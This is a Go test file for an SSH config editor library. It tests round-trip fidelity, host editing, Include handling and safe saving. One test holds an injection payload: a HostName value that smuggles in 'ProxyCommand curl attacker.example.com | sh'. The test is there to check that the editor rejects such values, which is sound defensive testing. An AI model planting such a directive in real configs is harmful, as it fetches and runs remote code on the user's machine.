package sshconf

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestRoundTrip is the load-bearing test for this whole project.
//
// Every fixture must survive load -> write byte for byte. If this ever fails,
// Capsula is silently reformatting configuration that people wrote by hand, and
// no amount of UI polish makes up for that.
//
// The fixtures are deliberately awkward: tab indentation, "Key=Value" with and
// without spaces, inline comments after a Host line, negated patterns, quoted
// values, CRLF endings and a file with no trailing newline. Writing by splicing
// the original bytes makes all of them exact; rendering from the parse tree
// does not.
func TestRoundTrip(t *testing.T) {
	fixtures := []string{
		"messy.conf",
		"global.conf",
		"match.conf",
		"root.conf",
		"conf.d/10-work.conf",
		"conf.d/20-home.conf",
		"crlf.conf",
		"no-trailing-newline.conf",
	}
	for _, name := range fixtures {
		t.Run(name, func(t *testing.T) {
			path := filepath.Join("testdata", name)
			want, err := os.ReadFile(path)
			if err != nil {
				t.Fatal(err)
			}
			set, err := Load(path)
			if err != nil {
				t.Fatalf("load: %v", err)
			}
			got := set.Files[0].Bytes()
			if string(got) != string(want) {
				t.Errorf("round trip changed the file\n--- want ---\n%s\n--- got ---\n%s", want, got)
			}
		})
	}
}

// TestUpdateActuallyWritesTheNewValue guards the sharpest edge in the
// underlying library: KV.String() prefers an unexported rawValue over the
// public Value field, so mutating the parse tree directly appears to succeed
// and then writes the old value. If this test fails, edits are being silently
// discarded.
func TestUpdateActuallyWritesTheNewValue(t *testing.T) {
	set := loadCopy(t, "messy.conf")
	b := findHost(t, set, "db")

	params := b.Params()
	for i := range params {
		if strings.EqualFold(params[i].Key, "HostName") {
			params[i].Value = "db2.internal"
		}
	}
	if err := b.Update(b.Patterns, params); err != nil {
		t.Fatalf("update: %v", err)
	}

	out := string(set.Files[0].Bytes())
	if !strings.Contains(out, "db2.internal") {
		t.Errorf("new value missing from output:\n%s", out)
	}
	if strings.Contains(out, "db.internal\n") || strings.Contains(out, "=db.internal") {
		t.Errorf("old value still present in output:\n%s", out)
	}
}

// TestUpdatePreservesCommentsAndIndent checks that editing one keyword does not
// cost the user the notes they left in that block.
func TestUpdatePreservesCommentsAndIndent(t *testing.T) {
	set := loadCopy(t, "messy.conf")
	b := findHost(t, set, "db")

	params := b.Params()
	for i := range params {
		if strings.EqualFold(params[i].Key, "ConnectTimeout") {
			params[i].Value = "10"
		}
	}
	if err := b.Update(b.Patterns, params); err != nil {
		t.Fatalf("update: %v", err)
	}

	out := string(set.Files[0].Bytes())
	if !strings.Contains(out, "# keep the timeout low, this box reboots a lot") {
		t.Errorf("comment inside the block was lost:\n%s", out)
	}
	if !strings.Contains(out, "  ConnectTimeout 10") {
		t.Errorf("indentation was not preserved:\n%s", out)
	}
	// Blocks the edit did not touch must be untouched.
	if !strings.Contains(out, "Host bastion.prod        # jump box, do not delete") {
		t.Errorf("an unrelated block was reformatted:\n%s", out)
	}
	if !strings.Contains(out, "\thostname 10.0.1.10") {
		t.Errorf("tab-indented block was reformatted:\n%s", out)
	}
}

// TestAddHostMatchesHouseStyle checks that a new block is indented the way the
// rest of the file is, rather than imposing Capsula's preference.
func TestAddHostMatchesHouseStyle(t *testing.T) {
	set := loadCopy(t, "messy.conf")
	before := string(set.Files[0].Bytes())

	_, err := set.AddHost(set.Files[0], []string{"newbox"}, []Param{
		{Key: "HostName", Value: "new.example.com"},
		{Key: "User", Value: "adrian"},
	})
	if err != nil {
		t.Fatalf("add: %v", err)
	}

	out := string(set.Files[0].Bytes())
	if !strings.HasPrefix(out, before) {
		t.Errorf("adding a host disturbed the existing content\n--- before ---\n%s\n--- after ---\n%s", before, out)
	}
	if !strings.Contains(out, "Host newbox\n    HostName new.example.com\n    User adrian\n") {
		t.Errorf("new block not rendered in the file's own indent style:\n%s", out)
	}
}

// TestFirstHostOnAMachineWithNoConfig covers the cold-start path: no
// ~/.ssh/config, no ~/.ssh directory, nothing.
func TestFirstHostOnAMachineWithNoConfig(t *testing.T) {
	path := filepath.Join(t.TempDir(), "nested", ".ssh", "config")
	set, err := Load(path)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if len(set.Files) != 0 {
		t.Fatalf("expected no files for a missing config, got %d", len(set.Files))
	}

	f := set.EnsureFile(path)
	if _, err := set.AddHost(f, []string{"first"}, []Param{{Key: "HostName", Value: "first.example.com"}}); err != nil {
		t.Fatalf("add: %v", err)
	}
	if err := set.Save(); err != nil {
		t.Fatalf("save: %v", err)
	}

	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if want := "Host first\n  HostName first.example.com\n"; string(got) != want {
		t.Errorf("got %q, want %q", got, want)
	}
	// ssh refuses to use a group- or world-accessible ~/.ssh.
	st, err := os.Stat(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	if st.Mode().Perm() != 0o700 {
		t.Errorf(".ssh created with mode %o, want 700", st.Mode().Perm())
	}
}

// TestEditingAppendsToTheRightFile checks that a host defined in an included
// file is edited in that file, not flattened into the root config.
func TestEditingAppendsToTheRightFile(t *testing.T) {
	set, err := Load(filepath.Join("testdata", "root.conf"))
	if err != nil {
		t.Fatal(err)
	}
	var nas *Block
	for _, b := range set.Hosts() {
		if b.Alias() == "nas" {
			nas = b
		}
	}
	if nas == nil {
		t.Fatal("nas not found")
	}
	if filepath.Base(nas.File.Path) != "20-home.conf" {
		t.Errorf("nas resolved to %s, want conf.d/20-home.conf", nas.File.Path)
	}
	root := set.Files[0]
	if root.Dirty() {
		t.Error("root config should not be dirty")
	}
}

func TestDeleteHost(t *testing.T) {
	set := loadCopy(t, "messy.conf")
	b := findHost(t, set, "quoted")
	if err := b.Delete(); err != nil {
		t.Fatalf("delete: %v", err)
	}
	out := string(set.Files[0].Bytes())
	if strings.Contains(out, "Host quoted") {
		t.Errorf("block still present:\n%s", out)
	}
	if !strings.Contains(out, "Host db") || !strings.Contains(out, "Host *") {
		t.Errorf("neighbouring blocks were damaged:\n%s", out)
	}
}

// TestMatchBlocksAreReadOnly pins the decision that Capsula reports on Match
// blocks but never rewrites them, since their conditions decide when they fire.
func TestMatchBlocksAreReadOnly(t *testing.T) {
	set := loadCopy(t, "match.conf")
	var match *Block
	for _, b := range set.Blocks() {
		if b.Kind == KindMatch {
			match = b
			break
		}
	}
	if match == nil {
		t.Fatal("no Match block parsed from match.conf")
	}
	if err := match.Update(nil, nil); err == nil {
		t.Error("expected Update to refuse a Match block")
	}
	if err := match.Delete(); err == nil {
		t.Error("expected Delete to refuse a Match block")
	}
}

// TestRejectsInjectedDirectives covers values arriving from a paste buffer. A
// newline in a value would splice arbitrary directives into the config.
func TestRejectsInjectedDirectives(t *testing.T) {
	set := loadCopy(t, "messy.conf")
	_, err := set.AddHost(set.Files[0], []string{"evil"}, []Param{
		{Key: "HostName", Value: "ok.example.com\n  ProxyCommand curl attacker.example.com | sh"},
	})
	if err == nil {
		t.Fatal("expected a multi-line value to be rejected")
	}
	if _, err := set.AddHost(set.Files[0], []string{"bad pattern"}, nil); err == nil {
		t.Error("expected a pattern containing whitespace to be rejected")
	}
}

func TestIncludeResolution(t *testing.T) {
	set, err := Load(filepath.Join("testdata", "root.conf"))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	if len(set.Files) != 3 {
		var names []string
		for _, f := range set.Files {
			names = append(names, f.Path)
		}
		t.Fatalf("expected root + 2 included files, got %d: %v", len(set.Files), names)
	}
	var aliases []string
	for _, b := range set.Hosts() {
		aliases = append(aliases, b.Alias())
	}
	want := []string{"direct", "jira", "nas"}
	for _, w := range want {
		found := false
		for _, a := range aliases {
			if a == w {
				found = true
			}
		}
		if !found {
			t.Errorf("host %q missing from %v", w, aliases)
		}
	}
}

// TestBlockClassification checks that the file preamble is not mistaken for a
// host, which would offer the user a nonsensical "(defaults)" entry to delete.
func TestBlockClassification(t *testing.T) {
	set, err := Load(filepath.Join("testdata", "global.conf"))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	blocks := set.Blocks()
	if len(blocks) < 2 {
		t.Fatalf("expected a global block and a host, got %d", len(blocks))
	}
	if blocks[0].Kind != KindGlobal {
		t.Errorf("first block should be the preamble, got %v", blocks[0].Kind)
	}
	if got := blocks[0].Get("ServerAliveInterval"); got != "30" {
		t.Errorf("preamble value = %q, want 30", got)
	}
	if len(set.Hosts()) != 1 {
		t.Errorf("Hosts() should exclude the preamble, got %d", len(set.Hosts()))
	}
}

// TestValuesAreReportedAsWritten checks the reverse of the rawValue trap: the
// value shown to the user must match the file, quoting and all.
func TestValuesAreReportedAsWritten(t *testing.T) {
	set := loadCopy(t, "messy.conf")
	b := findHost(t, set, "quoted")
	if got := b.Get("ProxyCommand"); got != `"/usr/local/bin/my proxy" -W %h:%p` {
		t.Errorf("ProxyCommand = %q, want the quoted form as written", got)
	}
	db := findHost(t, set, "db")
	if got := db.Get("HostName"); got != "db.internal" {
		t.Errorf("HostName = %q, want db.internal (the = separator should not leak)", got)
	}
}

func TestSaveIsAtomicAndBacksUp(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "config")
	orig := "Host a\n  HostName a.example.com\n"
	if err := os.WriteFile(path, []byte(orig), 0o600); err != nil {
		t.Fatal(err)
	}
	set, err := Load(path)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := set.AddHost(set.Files[0], []string{"b"}, []Param{{Key: "HostName", Value: "b.example.com"}}); err != nil {
		t.Fatal(err)
	}
	if err := set.Save(); err != nil {
		t.Fatalf("save: %v", err)
	}

	got, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(got), "Host b") {
		t.Errorf("new host not written:\n%s", got)
	}
	bak, err := os.ReadFile(path + BackupSuffix)
	if err != nil {
		t.Fatalf("backup missing: %v", err)
	}
	if string(bak) != orig {
		t.Errorf("backup = %q, want the original contents", bak)
	}
	st, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	if st.Mode().Perm()&0o077 != 0 {
		t.Errorf("config written with mode %o; ssh requires it not be group/world accessible", st.Mode().Perm())
	}
	// No temporary files left behind.
	entries, _ := os.ReadDir(dir)
	for _, e := range entries {
		if strings.HasPrefix(e.Name(), ".capsula-") {
			t.Errorf("temp file left behind: %s", e.Name())
		}
	}
}

// loadCopy loads a fixture from a temp copy so tests can mutate freely.
func loadCopy(t *testing.T, name string) *Set {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("testdata", name))
	if err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "config")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}
	set, err := Load(path)
	if err != nil {
		t.Fatalf("load %s: %v", name, err)
	}
	return set
}

func findHost(t *testing.T, s *Set, alias string) *Block {
	t.Helper()
	for _, b := range s.Hosts() {
		if b.Alias() == alias {
			return b
		}
	}
	t.Fatalf("host %q not found", alias)
	return nil
}

// TestMergeParamsPreservesUnmanagedKeywords is the guard against an edit form
// quietly deleting settings it has no field for.
func TestMergeParamsPreservesUnmanagedKeywords(t *testing.T) {
	original := []Param{
		{Key: "HostName", Value: "old.example.com"},
		{Key: "ControlMaster", Value: "auto"},
		{Key: "SetEnv", Value: "TERM=xterm-256color"},
		{Key: "User", Value: "olduser", Comment: " set by ops"},
	}
	managed := []string{"HostName", "User", "Port"}
	got := MergeParams(original, map[string]string{
		"HostName": "new.example.com",
		"User":     "newuser",
		"Port":     "2222",
	}, managed)

	want := []Param{
		{Key: "HostName", Value: "new.example.com"},
		{Key: "ControlMaster", Value: "auto"},
		{Key: "SetEnv", Value: "TERM=xterm-256color"},
		{Key: "User", Value: "newuser", Comment: " set by ops"},
		{Key: "Port", Value: "2222"},
	}
	if len(got) != len(want) {
		t.Fatalf("got %d params, want %d: %+v", len(got), len(want), got)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("param %d = %+v, want %+v", i, got[i], want[i])
		}
	}
}

// TestMergeParamsKeepsPosition matters because within a block ssh uses the
// first value it finds for a keyword.
func TestMergeParamsKeepsPosition(t *testing.T) {
	original := []Param{{Key: "User", Value: "a"}, {Key: "HostName", Value: "h"}}
	got := MergeParams(original, map[string]string{"User": "b"}, []string{"HostName", "User"})
	if got[0].Key != "User" {
		t.Errorf("edited keyword moved; order = %+v", got)
	}
}

func TestMergeParamsClearingRemovesTheLine(t *testing.T) {
	original := []Param{{Key: "HostName", Value: "h"}, {Key: "Port", Value: "2222"}}
	got := MergeParams(original, map[string]string{"Port": ""}, []string{"HostName", "Port"})
	for _, p := range got {
		if strings.EqualFold(p.Key, "Port") {
			t.Errorf("cleared keyword should be removed, got %+v", got)
		}
	}
}

// TestMergeParamsPreservesRepeatedKeywords covers IdentityFile, which users
// routinely set more than once while a form field can only show one.
func TestMergeParamsPreservesRepeatedKeywords(t *testing.T) {
	original := []Param{
		{Key: "IdentityFile", Value: "~/.ssh/first"},
		{Key: "IdentityFile", Value: "~/.ssh/second"},
	}
	got := MergeParams(original, map[string]string{"IdentityFile": "~/.ssh/changed"}, []string{"IdentityFile"})
	if len(got) != 2 {
		t.Fatalf("got %+v, want both identity files kept", got)
	}
	if got[0].Value != "~/.ssh/changed" {
		t.Errorf("first identity = %q, want the edited value", got[0].Value)
	}
	if got[1].Value != "~/.ssh/second" {
		t.Errorf("second identity = %q, want it preserved untouched", got[1].Value)
	}
}

// TestAddedHostIsImmediatelyAddressable checks that a newly added host is a
// first-class block: visible in Hosts(), and editable before any save.
func TestAddedHostIsImmediatelyAddressable(t *testing.T) {
	set := loadCopy(t, "messy.conf")
	b, err := set.AddHost(set.Files[0], []string{"fresh"}, []Param{{Key: "HostName", Value: "fresh.example.com"}})
	if err != nil {
		t.Fatal(err)
	}
	if findHost(t, set, "fresh") == nil {
		t.Fatal("new host missing from Hosts()")
	}
	if err := b.Update([]string{"fresh"}, []Param{{Key: "HostName", Value: "moved.example.com"}}); err != nil {
		t.Fatalf("editing a just-added host: %v", err)
	}
	out := string(set.Files[0].Bytes())
	if !strings.Contains(out, "moved.example.com") || strings.Contains(out, "fresh.example.com") {
		t.Errorf("edit of an unsaved host did not take:\n%s", out)
	}
	if err := b.Delete(); err != nil {
		t.Fatalf("deleting a just-added host: %v", err)
	}
	if strings.Contains(string(set.Files[0].Bytes()), "Host fresh") {
		t.Error("deleted host still rendered")
	}
}

// TestAddHostAfterFileWithNoTrailingNewline guards a splice that would
// otherwise weld the new header onto the previous last line.
func TestAddHostAfterFileWithNoTrailingNewline(t *testing.T) {
	set := loadCopy(t, "no-trailing-newline.conf")
	if _, err := set.AddHost(set.Files[0], []string{"second"}, []Param{{Key: "HostName", Value: "second.example.com"}}); err != nil {
		t.Fatal(err)
	}
	out := string(set.Files[0].Bytes())
	if strings.Contains(out, "end.example.comHost") || !strings.Contains(out, "\nHost second\n") {
		t.Errorf("new block welded onto the previous line:\n%q", out)
	}
}

// TestRepeatedEditsOfTheSameBlock is a regression test for a splice that was
// correct exactly once. When edits were held in a side map while f.lines kept
// the original text, the second edit indexed the new node list against the old
// lines and emitted the wrong ones.
func TestRepeatedEditsOfTheSameBlock(t *testing.T) {
	set := loadCopy(t, "messy.conf")

	for i, want := range []string{"one.example.com", "two.example.com", "three.example.com"} {
		b := findHost(t, set, "db")
		params := b.Params()
		for j := range params {
			if strings.EqualFold(params[j].Key, "HostName") {
				params[j].Value = want
			}
		}
		if err := b.Update(b.Patterns, params); err != nil {
			t.Fatalf("edit %d: %v", i, err)
		}
		out := string(set.Files[0].Bytes())
		if !strings.Contains(out, want) {
			t.Fatalf("edit %d did not take:\n%s", i, out)
		}
		// The comment inside the block must survive every round, not just the
		// first.
		if !strings.Contains(out, "# keep the timeout low, this box reboots a lot") {
			t.Fatalf("edit %d lost the block comment:\n%s", i, out)
		}
		if !strings.Contains(out, "\thostname 10.0.1.10") {
			t.Fatalf("edit %d damaged an unrelated block:\n%s", i, out)
		}
	}
	// And the file must still parse to the same shape it claims to have.
	if !set.Files[0].Editable() {
		t.Error("file became unaligned after repeated edits")
	}
}

// TestEditAfterDeleteUsesFreshIndices guards against acting on a stale Block
// after the blocks around it have shifted.
func TestEditAfterDeleteUsesFreshIndices(t *testing.T) {
	set := loadCopy(t, "messy.conf")

	if err := findHost(t, set, "db").Delete(); err != nil {
		t.Fatal(err)
	}
	// Re-read: every Block after the deleted one now has a stale index.
	q := findHost(t, set, "quoted")
	params := q.Params()
	for i := range params {
		if strings.EqualFold(params[i].Key, "RemoteCommand") {
			params[i].Value = `"tmux new -A -s work"`
		}
	}
	if err := q.Update(q.Patterns, params); err != nil {
		t.Fatal(err)
	}

	out := string(set.Files[0].Bytes())
	if strings.Contains(out, "Host db") {
		t.Errorf("deleted block came back:\n%s", out)
	}
	if !strings.Contains(out, `"tmux new -A -s work"`) {
		t.Errorf("edit landed in the wrong block:\n%s", out)
	}
	if !strings.Contains(out, "Host quoted") || !strings.Contains(out, "Host *") {
		t.Errorf("neighbouring blocks damaged:\n%s", out)
	}
}

// TestAddDeleteCycleDoesNotAccumulateBlankLines checks that repeatedly adding
// and removing a host leaves the file as it started.
func TestAddDeleteCycleDoesNotAccumulateBlankLines(t *testing.T) {
	set := loadCopy(t, "messy.conf")
	before := string(set.Files[0].Bytes())

	for range 3 {
		if _, err := set.AddHost(set.Files[0], []string{"temp"}, []Param{{Key: "HostName", Value: "t.example.com"}}); err != nil {
			t.Fatal(err)
		}
		if err := findHost(t, set, "temp").Delete(); err != nil {
			t.Fatal(err)
		}
	}
	if got := string(set.Files[0].Bytes()); got != before {
		t.Errorf("add/delete cycle changed the file\n--- before ---\n%q\n--- after ---\n%q", before, got)
	}
}
